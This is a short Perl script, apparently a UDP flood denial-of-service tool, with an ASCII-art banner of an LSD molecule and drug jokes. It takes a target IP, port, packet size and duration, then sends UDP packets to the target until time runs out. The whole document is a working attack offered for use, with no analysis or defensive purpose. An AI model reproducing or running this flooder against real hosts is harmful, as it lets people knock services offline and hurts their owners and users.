#!/usr/bin/perl

##
# DgH By SnowmaN<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;
██╗     ███████╗██████╗ 
██║     ██╔════╝██╔══██╗
██║     ███████╗██║  ██║
██║     ╚════██║██║  ██║
███████╗███████║██████╔╝
╚══════╝╚══════╝╚═════╝ 
                     H
                     |
               H  H  C--H
                `.|,'|
                  C  H  H
                  |     |
             O    N  H  C
             \\ ,' `.|,'|`.
               C     C  H  H
               |     |
            H--C     H
             ,' `.
      H  H--C  H--C--H
      |     ||    |
H     C     C     N  H  H
 `. ,' `. ,' `. ,' `.|,'
   C  _  C  H  C     C
   | (_) |   `.|     |
   C     C     C     H
 ,' `. ,' `. ,' `.
H     C     C     H
      |    ||
      N-----C
      |     |
      H     H                      
 I think the LSD is workin. DAMN SMILEWARE THIS SOME GOOD SHIT. SCIENCE BITCHHHHH
EOTEXT

print "::Hold My Beer:: $ip " . ($port ? $port : "random") . " Disconnected = " .
  ($size ? "$size-byte" : "Disconnected :)") . "~LSD~" .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}